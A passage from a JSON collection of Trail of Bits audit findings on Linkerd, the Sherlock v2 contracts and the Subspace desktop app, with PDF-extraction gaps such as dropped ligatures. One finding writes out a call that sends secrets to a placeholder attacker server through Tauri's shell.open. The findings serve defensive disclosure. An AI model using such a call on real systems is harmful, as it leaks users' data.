        "description": "While security recommendations are included throughout Linkerds technical guidance documents, there is no centralized guidance on security best practices. Furthermore, the documentation on securing clusters lacks guidance on security best practices such as conguring timeouts and retries, authorization policy recommendations for defense in depth, and locking down access to linkerd-viz components. Threat Scenario A user is unaware of security best practices and congures Linkerd in an insecure manner. As a result, her Linkerd infrastructure is prone to attacks that could compromise the condentiality, integrity, and availability of data handled by the cluster. Recommendations Short term, develop centralized documentation on security recommendations with a focus on security-in-depth practices for users to follow. This guidance should be easy to locate should any user wish to follow security best practices when using Linkerd. 44 Linkerd Threat Model 13. Unclear distinction between Linkerd and Linkerd2 in o\u0000cial Linkerd blog post guidance Severity: Informational Diculty: Informational Type: Awareness and Training Finding ID: TOB-LKDTM-13 Target: Linkerd",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Informational"
        ]
    },
    {
        "title": "3. CLI tool allows the use of insecure protocols when externally sourcing infrastructure denitions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf",
        "description": "When using the command-line interface (CLI) tool, an operator may source infrastructural YAML denitions from a URI path specifying any protocol, such as http:// or https://. Therefore, a user could expose sensitive information when using an insecure protocol such as HTTP. Furthermore, the Linkerd documentation does not warn users about the systems use of insecure protocols. Threat Scenario An infrastructure operator integrates Linkerd into her infrastructure. When doing so, she uses the CLI tool to fetch YAML denitions over HTTP. Unbeknownst to her, the use of HTTP has made her data visible to attackers on the local network. Her data is also prone to man-in-the-middle attacks. Recommendations Short term, disallow the use of insecure protocols within the CLI tool when sourcing external data. Alternatively, provide documentation and best practices regarding the use of insecure protocols when externally sourcing data within the CLI tool. 35 Linkerd Threat Model",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "4. Exposure of admin endpoint may a\u0000ect application availability ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf",
        "description": "User application sidecar proxies expose an admin endpoint that can be used for tasks such as shutting down the proxy server and collecting metrics. This endpoint is exposed to other components within the same pod. Therefore, an internal attacker could shut down the proxy, aecting the user applications availability. Furthermore, the admin endpoint lacks access controls, and the documentation does not warn of the risks of exposing the admin endpoint over the internet. Threat Scenario An infrastructure operator integrates Linkerd into his Kubernetes cluster. After a new user application is deployed, an underlying component within the same pod is compromised. An attacker with access to the compromised component can now laterally send a request to the admin endpoint used to shut down the proxy server, resulting in a denial of service of the user application. Recommendations Short term, employ authentication and authorization mechanisms behind the admin endpoint for proxy servers. Long term, document the risks of exposing critical components throughout Linkerd. For instance, it is important to note that exposing the admin endpoint on a user application proxy server may result in the exposure of a shutdown method, which could be leveraged in a denial-of-service attack. 36 Linkerd Threat Model",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "12. Lack of centralized security best practices documentation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf",
        "description": "While security recommendations are included throughout Linkerds technical guidance documents, there is no centralized guidance on security best practices. Furthermore, the documentation on securing clusters lacks guidance on security best practices such as conguring timeouts and retries, authorization policy recommendations for defense in depth, and locking down access to linkerd-viz components. Threat Scenario A user is unaware of security best practices and congures Linkerd in an insecure manner. As a result, her Linkerd infrastructure is prone to attacks that could compromise the condentiality, integrity, and availability of data handled by the cluster. Recommendations Short term, develop centralized documentation on security recommendations with a focus on security-in-depth practices for users to follow. This guidance should be easy to locate should any user wish to follow security best practices when using Linkerd. 44 Linkerd Threat Model",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Informational"
        ]
    },
    {
        "title": "13. Unclear distinction between Linkerd and Linkerd2 in o\u0000cial Linkerd blog post guidance ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf",
        "description": "The ocial Linkerd documentation clearly indicates the version of Linkerd that each document pertains to. For instance, documentation specic to Linkerd 1.x displays a message stating, This is not the latest version of Linkerd! However, guidance documented in blog post form on the same site does not provide such information. For instance, the rst result of a Google search for Linkerd RBAC is a Linkerd blog post with guidance that is applicable only to linkerd 1.x, but there is no indication of this fact on the page. As a result, users who rely on these blog posts may misunderstand functionality in Linkerd versions 2.x and above. Threat Scenario A user searches for guidance on implementing various Linkerd features and nds documentation in blog posts that applies only to Linkerd version 1.x. As a result, he misunderstands Linkerd and its threat model, and he makes conguration mistakes that lead to security issues. Recommendations Short term, on Linkerd blog post pages, add indicators similar to the UI elements used in the Linkerd documentation to clearly indicate which version each guidance page applies to. 45 Linkerd Threat Model",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Informational"
        ]
    },
    {
        "title": "14. Insu\u0000cient logging of outbound HTTPS calls ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf",
        "description": "Linkerd operators can use the linkerd-viz extensions such as Prometheus and Grafana to collect metrics for the various proxies in a Linkerd infrastructure. However, these extensions do not collect metrics on outbound calls made by meshed applications. This limits the data that operators could use to conduct incident response procedures if compromised applications reach out to malicious external services and servers. Threat Scenario A meshed application running in the data plane is compromised as a result of a supply chain attack. Because outbound HTTPS calls are not logged, Linkerd operators are unable to collect sucient data to determine the impact of the vulnerability. Recommendations Short term, implement logging for outbound HTTPS connections. A GitHub issue to implement this recommendation already exists in the Linkerd repository but is still unresolved as of this writing. 46 Linkerd Threat Model A. Methodology A threat modeling assessment is intended to provide a detailed analysis of the risks that an application faces at the structural and operational level; the goal is to assess the security of the applications design rather than its implementation details. During these assessments, engineers rely heavily on frequent meetings with the clients developers and on extensive reading of all documentation provided by the client. Code review and dynamic testing are not part of the threat modeling process, although engineers may occasionally consult the codebase or a live instance of the project to verify assumptions about the systems design. Engineers begin a threat modeling assessment by identifying the safeguards and guarantees that are critical to maintaining the target systems condentiality, integrity, and availability. These security controls dictate the assessments overarching scope and are determined by the requirements of the target system, which may relate to technical and reputational concerns, legal liability, and regulatory compliance. With these security controls in mind, engineers then divide the system into logical componentsdiscrete elements that perform specic tasksand establish trust zones around groups of components that lie within a common trust boundary. They identify the types of data handled by the system, enumerating the points at which data is sent, received, or stored by each component, as well as within and across trust boundaries. After establishing a detailed map of the target systems structure and data ows, engineers then identify threat actorsanyone who might threaten the targets security, including both malicious external actors and naive internal actors. Based on each threat actors initial privileges and knowledge, engineers then trace threat actor paths through the system, determining the controls and data that a threat actor might be able to improperly access, as well as the safeguards that prevent such access. Any viable attack path discovered during this process constitutes a nding, which is paired with design recommendations to remediate gaps in the systems defenses. Finally, engineers rate the strength of each security control, indicating the general robustness of that type of defense against the full spectrum of possible attacks. These ratings are provided in the Security Control Maturity Evaluation table. 47 Linkerd Threat Model B. Security Controls and Rating Criteria The following tables describe the security controls and rating criteria used in this report. Security Controls Category",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Solidity compiler optimizations can be problematic ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Sherlockv2.pdf",
        "description": "Sherlock has enabled optional compiler optimizations in Solidity. There have been several optimization bugs with security implications. Moreover, optimizations are actively being developed. Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. Therefore, it is unclear how well they are being tested and exercised. High-severity security issues due to optimization bugs have occurred in the past. A high-severity bug in the emscripten-generated solc-js compiler used by True and Remix persisted until late 2018. The x for this bug was not reported in the Solidity CHANGELOG. Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6. More recently, another bug due to the incorrect caching of keccak256 was reported. A compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe. It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations. Exploit Scenario A latent or future bug in Solidity compiler optimizationsor in the Emscripten transpilation to solc-jscauses a security vulnerability in the Sherlock contracts. Recommendations Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Certain functions lack zero address checks ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Sherlockv2.pdf",
        "description": "Certain functions fail to validate incoming arguments, so callers can accidentally set important state variables to the zero address. For example, the AaveV2Strategy contracts constructor function does not validate the aaveLmReceiver, which is the address that receives Aave rewards on calls to AaveV2Strategy.claimRewards. 39 40 41 42 43 44 45 46 47 } constructor(IAToken _aWant, address _aaveLmReceiver) { aWant = _aWant; // This gets the underlying token associated with aUSDC (USDC) want = IERC20(_aWant.UNDERLYING_ASSET_ADDRESS()); // Gets the specific rewards controller for this token type aaveIncentivesController = _aWant.getIncentivesController(); aaveLmReceiver = _aaveLmReceiver; Figure 2.1: managers/AaveV2Strategy.sol:39-47 If the aaveLmReceiver variable is set to the address zero, the Aave contract will revert with INVALID_TO_ADDRESS. This prevents any Aave rewards from being claimed for the designated token. The following functions are missing zero address checks:  Manager.setSherlockCoreAddress  AaveV2Strategy.sweep  SherDistributionManager.sweep  SherlockProtocolManager.sweep  Sherlock.constructor Exploit Scenario Bob deploys AaveV2Strategy with aaveLmReceiver set to the zero address. All calls to claimRewards revert. Recommendations Short term, add zero address checks on all function arguments to ensure that users cannot accidentally set incorrect values. Long term, use Slither, which will catch functions that do not have zero address checks.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. updateYieldStrategy could leave funds in the old strategy ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Sherlockv2.pdf",
        "description": "The updateYieldStrategy function sets a new yield strategy manager contract without calling yieldStrategy.withdrawAll() on the old strategy, potentially leaving funds in it. 257 // Sets a new yield strategy manager contract 258 /// @notice Update yield strategy 259 /// @param _yieldStrategy News address of the strategy 260 /// @dev try a yieldStrategyWithdrawAll() on old, ignore failure 261 function updateYieldStrategy(IStrategyManager _yieldStrategy) external override onlyOwner { 262 263 264 265 266 yieldStrategy = _yieldStrategy; 267 } if (address(_yieldStrategy) == address(0)) revert ZeroArgument(); if (yieldStrategy == _yieldStrategy) revert InvalidArgument(); emit YieldStrategyUpdated(yieldStrategy, _yieldStrategy); Figure 3.1: contracts/Sherlock.sol:257-267 Even though one could re-add the old strategy to recover the funds, this issue could cause stakers and the protocols insured by Sherlock to lose trust in the system. This issue has a signicant impact on the result of totalTokenBalanceStakers, which is used when calculating the shares in initialStake. totalTokenBalanceStakers uses the balance of the yield strategy. If the balance is missing the funds that should have been withdrawn from a previous strategy, the result will be incorrect. return 151 function totalTokenBalanceStakers() public view override returns (uint256) { 152 153 token.balanceOf(address(this)) + 154 155 sherlockProtocolManager.claimablePremiums(); 156 } yieldStrategy.balanceOf() + Figure 3.2: contracts/Sherlock.sol:151-156 uint256 _amount, uint256 _period, address _receiver 483 function initialStake( 484 485 486 487 ) external override whenNotPaused returns (uint256 _id, uint256 _sher) { ... 501 502 stakeShares_ = (_amount * totalStakeShares_) / (totalTokenBalanceStakers() - _amount); 503 // If this is the first stake ever, we just mint stake shares equal to the amount of USDC staked 504 else stakeShares_ = _amount; if (totalStakeShares_ != 0) Figure 3.3: contracts/Sherlock.sol:483-504 Exploit Scenario Bob, the owner of the Sherlock contract, calls updateYieldStrategy with a new strategy. Eve calls initialStake and receives more shares than she is due because totalTokenBalanceStakers returns a signicantly lower balance than it should. Bob notices the missing funds, calls updateYieldStrategy with the old strategy and then yieldStrategy.WithdrawAll to recover the funds, and switches back to the new strategy. Eves shares now have notably more value. Recommendations Short term, in updateYieldStrategy, add a call to yieldStrategy.withdrawAll() on the old strategy. Long term, when designing systems that store funds, use extensive unit testing and property-based testing to ensure that funds cannot become stuck.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Pausing and unpausing the system may not be possible when removing or replacing connected contracts ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Sherlockv2.pdf",
        "description": "The Sherlock contract allows all of the connected contracts to be paused or unpaused at the same time. However, if the sherDistributionManager contract is removed, or if any of the connected contracts are replaced when the system is paused, it might not be possible to pause or unpause the system. function removeSherDistributionManager() external override onlyOwner { if (address(sherDistributionManager) == address(0)) revert InvalidConditions(); emit SherDistributionManagerUpdated( sherDistributionManager, ISherDistributionManager(address(0)) ); delete sherDistributionManager; 206 207 208 209 210 211 212 213 214 } Figure 4.1: contracts/Sherlock.sol:206-214 Of all the connected contracts, the only one that can be removed is the sherDistributionManager contract. On the other hand, all of the connected contracts can be replaced through an update function. function pause() external onlyOwner { _pause(); yieldStrategy.pause(); sherDistributionManager.pause(); sherlockProtocolManager.pause(); sherlockClaimManager.pause(); 302 303 304 305 306 307 308 } 309 310 311 /// @notice Unpause external functions in all contracts function unpause() external onlyOwner { 312 313 314 315 316 317 } _unpause(); yieldStrategy.unpause(); sherDistributionManager.unpause(); sherlockProtocolManager.unpause(); sherlockClaimManager.unpause(); Figure 4.2: contracts/Sherlock.sol:302-317 If the sherDistributionManager contract is removed, a call to Sherlock.pause will revert, as it is attempting to call the zero address. If sherDistributionManager is removed while the system is paused, then a call to Sherlock.unpause will revert for the same reason. If any of the contracts is replaced while the system is paused, the replaced contract will be in an unpaused state while the other contracts are still paused. As a result, a call to Sherlock.unpause will revert, as it is attempting to unpause an already unpaused contract. Exploit Scenario Bob, the owner of the Sherlock contract, pauses the system to replace the sherlockProtocolManager contract, which contains a bug. Bob deploys a new sherlockProtocolManager contract and calls updateSherlockProtocolManager to set the new address in the Sherlock contract. To unpause the system, Bob calls Sherlock.unpause, which reverts because sherlockProtocolManager is already unpaused. Recommendations Short term, add conditional checks to the Sherlock.pause and Sherlock.unpause functions to check that a contract is either paused or unpaused, as expected, before attempting to update its state. For sherDistributionManager, the check should verify that the contract to be paused or unpaused is not the zero address. Long term, for pieces of code that depend on the states of multiple contracts, implement unit tests that cover each possible combination of contract states.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "5. SHER reward calculation uses confusing six-decimal SHER reward rate ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Sherlockv2.pdf",
        "description": "The reward calculation in calcReward uses a six-decimal SHER reward rate value. This might confuse readers and developers of the contracts because the SHER token has 18 decimals, and the calculated reward will also have 18 decimals. Also, this value does not allow the SHER reward rate to be set below 0.000001000000000000 SHER. function calcReward( 89 90 91 92 93 ) public view override returns (uint256 _sher) { uint256 _tvl, uint256 _amount, uint256 _period 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 [..] // If there are some max rewards available... if (maxRewardsAvailable != 0) { // And if the entire stake is still within the maxRewardsAvailable amount if (_amount <= maxRewardsAvailable) { // Then the entire stake amount should accrue max SHER rewards return (_amount * maxRewardsRate * _period) * DECIMALS; } else { // Otherwise, the stake takes all the maxRewardsAvailable left  // We add the maxRewardsAvailable amount to the TVL (now _tvl _tvl += maxRewardsAvailable; // We subtract the amount of the stake that received max rewards _amount -= maxRewardsAvailable; // We accrue the max rewards available at the max rewards  // This could be: $20M of maxRewardsAvailable which gets  // Calculation continues after this _sher += (maxRewardsAvailable * maxRewardsRate * _period) * DECIMALS; } } // If there are SHER rewards still available  if (slopeRewardsAvailable != 0) { _sher += (((zeroRewardsStartTVL - position) * _amount * maxRewardsRate * _period) / (zeroRewardsStartTVL - maxRewardsEndTVL)) * DECIMALS; 144 145 146 147 148 149 } } Figure 5.1: contracts/managers/SherDistributionManager.sol:89-149 In the reward calculation, the 6-decimal maxRewardsRate is rst multiplied by _amount and _period, resulting in a 12-decimal intermediate product. To output a nal 18-decimal product, this 12-decimal product is multiplied by DECIMALS to add 6 decimals. Although this leads to a correct result, it would be clearer to use an 18-decimal value for maxRewardsRate and to divide by DECIMALS at the end of the calculation. // using 6 decimal maxRewardsRate (10e6 * 1e6 * 10) * 1e6 = 100e18 = 100 SHER // using 18 decimal maxRewardsRate (10e6 * 1e18 * 10) / 1e6 = 100e18 = 100 SHER Figure 5.2: Comparison of a 6-decimal and an 18-decimal maxRewardsRate Exploit Scenario Bob, a developer of the Sherlock protocol, writes a new version of the SherDistributionManager contract that changes the reward calculation. He mistakenly assumes that the SHER maxRewardsRate has 18 decimals and updates the calculation incorrectly. As a result, the newly calculated reward is incorrect. Recommendations Short term, use an 18-decimal value for maxRewardsRate and divide by DECIMALS instead of multiplying. Long term, when implementing calculations that use the rate of a given token, strive to use a rate variable with the same number of decimals as the token. This will prevent any confusion with regard to decimals, which might lead to introducing precision bugs when updating the contracts.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. A claim cannot be paid out or escalated if the protocol agent changes after the claim has been initialized ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Sherlockv2.pdf",
        "description": "The escalate and payoutClaim functions can be called only by the protocol agent that started the claim. Therefore, if the protocol agent role is reassigned after a claim is started, the new protocol agent will be unable to call these functions and complete the claim. function escalate(uint256 _claimID, uint256 _amount) external override nonReentrant whenNotPaused 388 389 390 391 392 393 { 394 395 396 397 398 399 400 401 402 403 if (_amount < BOND) revert InvalidArgument(); // Gets the internal ID of the claim bytes32 claimIdentifier = publicToInternalID[_claimID]; if (claimIdentifier == bytes32(0)) revert InvalidArgument(); // Retrieves the claim struct Claim storage claim = claims_[claimIdentifier]; // Requires the caller to be the protocol agent if (msg.sender != claim.initiator) revert InvalidSender(); Figure 6.1: contracts/managers/SherlockClaimManager.sol:388-403 Due to this scheme, care should be taken when updating the protocol agent. That is, the protocol agent should not be reassigned if there is an existing claim. However, if the protocol agent is changed when there is an existing claim, the protocol agent role could be transferred back to the original protocol agent to complete the claim. Exploit Scenario Alice is the protocol agent and starts a claim. Alice transfers the protocol agent role to Bob. The claim is approved by SPCC and can be paid out. Bob calls payoutClaim, but the transaction reverts. Recommendations Short term, update the comment in the escalate and payoutClaim functions to state that the caller needs to be the protocol agent that started the claim, and clearly describe this requirement in the protocol agent documentation. Alternatively, update the check to verify that msg.sender is the current protocol agent rather than specically the protocol agent who initiated the claim. Long term, review and document the eects of the reassignment of privileged roles on the systems state transitions. Such a review will help uncover cases in which the reassignment of privileged roles causes issues and possibly a denial of service to (part of) the system.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Missing input validation in setMinActiveBalance could cause a confusing event to be emitted ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Sherlockv2.pdf",
        "description": "The setMinActiveBalance functions input validation is incomplete: it should check that the minActiveBalance has not been set to its existing value, but this check is missing. Additionally, if the minActiveBalance is set to its existing value, the emitted MinBalance event will indicate that the old and new values are identical. This could confuse systems monitoring the contract that expect this event to be emitted only when the minActiveBalance changes. function setMinActiveBalance(uint256 _minActiveBalance) external override onlyOwner { // Can't set a value that is too high to be reasonable require(_minActiveBalance < MIN_BALANCE_SANITY_CEILING, 'INSANE'); emit MinBalance(minActiveBalance, _minActiveBalance); minActiveBalance = _minActiveBalance; 422 423 424 425 426 427 428 } Figure 7.1: contracts/managers/SherlockProtocolManager.sol:422-428 Exploit Scenario An o-chain monitoring system controlled by the Sherlock protocol is listening for events that indicate that a contract conguration value has changed. When such events are detected, the monitoring system sends an email to the admins of the Sherlock protocol. Alice, a contract owner, calls setMinActiveBalance with the existing minActiveBalance as input. The o-chain monitoring system detects the emitted event and noties the Sherlock protocol admins. The Sherlock protocol admins are confused since the value did not change. Recommendations Short term, add input validation that causes setMinActiveBalance to revert if the proposed minActiveBalance value equals the current value. Long term, document and test the expected behavior of all the systems events. Consider using a blockchain-monitoring system to track any suspicious behavior in the contracts.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "8. payoutClaims calling of external contracts in a loop could cause a denial of service ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Sherlockv2.pdf",
        "description": "The payoutClaim function uses a loop to call the PreCorePayoutCallback function on a list of external contracts. If any of these calls reverts, the entire payoutClaim function reverts, and, hence, the transaction reverts. This may not be the desired behavior; if that is the case, a denial of service would prevent claims from being paid out. for (uint256 i; i < claimCallbacks.length; i++) { claimCallbacks[i].PreCorePayoutCallback(protocol, _claimID, amount); 499 500 501 } Figure 8.1: contracts/managers/SherlockClaimManager.sol:499-501 The owner of the SherlockClaimManager contract controls the list of contracts on which the PreCorePayoutCallback function is called. The owner can add or remove contracts from this list at any time. Therefore, if a contract is causing unexpected reverts, the owner can x the problem by (temporarily) removing that contract from the list. It might be expected that some of these calls revert and cause the entire transaction to revert. However, the external contracts that will be called and the expected behavior in the event of a revert are currently unknown. If a revert should not cause the entire transaction to revert, the current implementation does not fulll that requirement. To accommodate both casesa revert of an external call reverts the entire transaction or allows the transaction to continue a middle road can be taken. For each contract in the list, a boolean could indicate whether the transaction should revert or continue if the external call fails. If the boolean indicates that the transaction should continue, an emitted event would indicate the contract address and the input arguments of the callback that reverted. This would allow the system to continue functioning while admins investigate the cause of the revert and x the issue(s) if needed. Exploit Scenario Alice, the owner of the SherlockClaimManager contract, registers contract A in the list of contracts on which PreCorePayoutCallback is called. Contract A contains a bug that causes the callback to revert every time. Bob, a protocol agent, successfully les a claim and calls payoutClaim. The transaction reverts because the call to contract A reverts. Recommendations Short term, review the requirements of contracts that will be called by callback functions, and adjust the implementation to fulll those requirements. Long term, when designing a system reliant on external components that have not yet been determined, carefully consider whether to include those integrations during the development process or to wait until those components have been identied. This will prevent unforeseen problems due to incomplete or incorrect integrations with unknown contracts.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "9. pullReward could silently fail and cause stakers to lose all earned SHER rewards ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Sherlockv2.pdf",
        "description": "If the SherDistributionManager.pullReward function reverts, the calling function (_stake) will not set the SHER rewards in the stakers position NFT. As a result, the staker will not receive the payout of SHER rewards after the stake period has passed. // Sets the timestamp at which this position can first be unstaked/restaked lockupEnd_[_id] = block.timestamp + _period; if (address(sherDistributionManager) == address(0)) return 0; // Does not allow restaking of 0 tokens if (_amount == 0) return 0; // Checks this amount of SHER tokens in this contract before we transfer new ones uint256 before = sher.balanceOf(address(this)); // pullReward() calcs then actually transfers the SHER tokens to this contract try sherDistributionManager.pullReward(_amount, _period, _id, _receiver) returns ( function _stake( uint256 _amount, uint256 _period, uint256 _id, address _receiver 354 355 356 357 358 359 ) internal returns (uint256 _sher) { 360 361 362 363 364 365 366 367 368 369 370 371 372 373 374 375 376 377 378 379 380 381 } catch (bytes memory reason) { _sher = amount; uint256 amount ) { } // If for whatever reason the sherDistributionManager call fails emit SherRewardsError(reason); return 0; // actualAmount should represent the amount of SHER tokens transferred to this contract for the current stake position 382 383 384 385 386 } uint256 actualAmount = sher.balanceOf(address(this)) - before; if (actualAmount != _sher) revert InvalidSherAmount(_sher, actualAmount); // Assigns the newly created SHER tokens to the current stake position sherRewards_[_id] = _sher; Figure 9.1: contracts/Sherlock.sol:354-386 When the pullReward call reverts, the SherRewardsError event is emitted. The staker could check this event and see that no SHER rewards were set. The staker could also call the sherRewards function and provide the positions NFT ID to check whether the SHER rewards were set. However, stakers should not be expected to make these checks after every (re)stake. There are two ways in which the pullReward function can fail. First, a bug in the arithmetic could cause an overow and revert the function. Second, if the SherDistributionManager contract does not hold enough SHER to be able to transfer the calculated amount, the pullReward function will fail. The SHER balance of the contract needs to be manually topped up. If a staker detects that no SHER was set for her (re)stake, she may want to cancel the stake. However, stakers are not able to cancel a stake until the stakes period has passed (currently, at least three months). Exploit Scenario Alice creates a new stake, but the SherDistributionManager contract does not hold enough SHER to transfer the rewards, and the transaction reverts. The execution continues and sets Alices stake allocation to zero. Recommendations Short term, have the system revert transactions if pullReward reverts. Long term, have the system revert transactions if part of the expected rewards are not allocated due to an internal revert. This will prevent situations in which certain users get rewards while others do not.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Desktop application conguration le stored in group writable le ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-subspacenetwork-subspacenetworkdesktopfarmer-securityreview.pdf",
        "description": "The desktop application conguration le has group writable permissions, as shown in gure 1.1. >>> ls -l $HOME/.config/subspace-desktop/subspace-desktop.cfg -rw-rw-r-- 1 user user 143 $HOME/.config/subspace-desktop/subspace-desktop.cfg Figure 1.1: Permissions of the $HOME/.config/subspace-desktop/subspace-desktop.cfg le This conguration le contains the rewardAddress eld (gure 1.2), to which the Subspace farmer sends the farming rewards. Therefore, anyone who can modify this le can control the address that receives farming rewards. For this reason, only the le owner should have the permissions necessary to write to it. { \"plot\" : { \"location\" : \"<REDACTED>/.local/share/subspace-desktop/plots\" , \"sizeGB\" : 1 }, \"rewardAddress\" : \"stC2Mgq<REDACTED>\" , \"launchOnBoot\" : true , \"version\" : \"0.6.11\" , \"nodeName\" : \"agreeable-toothbrush-4936\" } Figure 1.2: An example of a conguration le Exploit Scenario An attacker controls a Linux user who belongs to the victims user group. Because every member of the user group is able to write to the victims conguration le, the attacker is able to change the rewardAddress eld of the le to an address she controls. As a result, she starts receiving the victims farming rewards. Recommendations Short term, change the conguration les permissions so that only its owner can read and write to it. This will prevent unauthorized users from reading and modifying the le. Additionally, create a centralized function that creates the conguration le; currently, the le is created by code in multiple places in the codebase. Long term, create tests to ensure that the conguration le is created with the correct permissions. 2. Insu\u0000cient validation of users reward addresses Severity: Low Diculty: Medium Type: Data Validation Finding ID: TOB-SPDF-2 Target: subspace-desktop/src/pages/ImportKey.vue",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Improper error handling ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-subspacenetwork-subspacenetworkdesktopfarmer-securityreview.pdf",
        "description": "The front end code handles errors incorrectly in the following cases:          The Linux auto launcher function createAutostartDir does not return an error if it fails to create the autostart directory. The Linux auto launcher function enable does not return an error if it fails to create the autostart le. The Linux auto launcher function disable does not return an error if it fails to remove the autostart le. The Linux auto launcher function isEnabled always returns true , even if it fails to read the autostart le, which indicates that the auto launcher is disabled. The exportLogs function does not display error messages to users when errors occur. Instead, it silently fails. If rewardAddress is not set, the startFarming function sends an error log to the back end but not to the front end. Despite the error, the function still tries to start farming without a reward address, causing the back end to error out. Without an error message displayed in the front end, the source of the failure is unclear. The Config::init function does not show users an error message if it fails to create the conguration directory. The Config::write function does not show users an error message if it fails to create the conguration directory, and it proceeds to try to write to the nonexistent conguration le. Additionally, it does not show an error message if it fails to write to the conguration le in its call to writeFile . The removePlot function does not return an error if it fails to delete the plots directory.   The createPlotDir function does not return an error if it fails to create the plots folder (e.g., if the given user does not have the permissions necessary to create the folder in that directory). This will cause the startPlotting function to fail silently; without an error message, the user cannot know the source of the failure. The createAutostartDir function logs an error unnecessarily. The function determines whether a directory exists by calling the readDir function; however, even though occasionally the directory may not be found (as expected), the function always logs an error if it is not found. Exploit Scenario To store his plots, a user chooses a directory that he does not have the permissions necessary to write to. The program fails but does not display a clear error message with the reason for the failure. The user cannot understand the problem, becomes frustrated, and deletes the application. Recommendations Short term, modify the code in the locations described above to handle errors consistently and to display messages with clear reasons for the errors in the UI. This will make the code more reliable and reduce the likelihood that users will face obstacles when using the Subspace Desktop application. Long term, write tests that trigger all possible error conditions and check that all errors are handled gracefully and are accompanied by error messages displayed to the user where relevant. This will prevent regressions during the development process.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "4. Flawed regex in the Tauri conguration ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-subspacenetwork-subspacenetworkdesktopfarmer-securityreview.pdf",
        "description": "The Tauri conguration that limits which les the front end can open with the systems default applications is awed. As shown in gure 4.1, the conguration le uses the [/subspace\\\\-desktop/] regex; the Subspace developers intended this regex to match le names that include the /subspace-desktop/ string, but the regex actually matches any string that has a single character inside the regex's square brackets. \"shell\" : { \"all\" : true , \"execute\" : true , \"open\" : \"[/subspace\\\\-desktop/]\" , \"scope\" : [ \"name\" : \"run-osascript\" , \"cmd\" : \"osascript\" , \"args\" : true { } ] }, Figure 4.1: subspace-desktop/src-tauri/tauri.conf.json#L81-L92 For example, tauri.shell.open(\"s\") is accepted as a valid location because s is inside the regexs square brackets. Contrarily, tauri.shell.open(\"z\") is an invalid location because z is not inside the square brackets. Besides opening les, in Linux, the tauri.shell.open function will handle anything that the xdg-open command handles. For example, tauri.shell.open(\"apt://firefox\") shows users a prompt to install Firefox. Attackers could also use the tauri.shell.open function to make arbitrary HTTP requests and bypass the CSPs connect-src directive with calls such as tauri.shell.open(\"https://<attacker-server>/?secret_data=<secrets>\") . Exploit Scenario An attacker nds a cross-site scripting (XSS) vulnerability in the Subspace Desktop front end. He uses the XSS vulnerability to open an arbitrary URL protocol with the exploit described above and gains the ability to remotely execute code on the users machine. For examples of how common URL protocol handlers can lead to remote code execution attacks, refer to the vulnerabilities in the Steam and Visual Studio Code URL protocols. Recommendations Short term, revise the regex so that the front end can open only file: URLs that are within the Subspace Desktop applications logs folder. Alternatively, have the Rust back end serve these les and disallow the front end from accessing any les (see issue TOB-SPDF-5 for a more complete architectural recommendation). Long term, write positive and negative tests that check the developers assumptions related to the Tauri conguration. 5. Insu\u0000cient privilege separation between the front end and back end Severity: Medium Diculty: High Type: Conguration Finding ID: TOB-SPDF-5 Target: The Subspace Desktop architecture",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
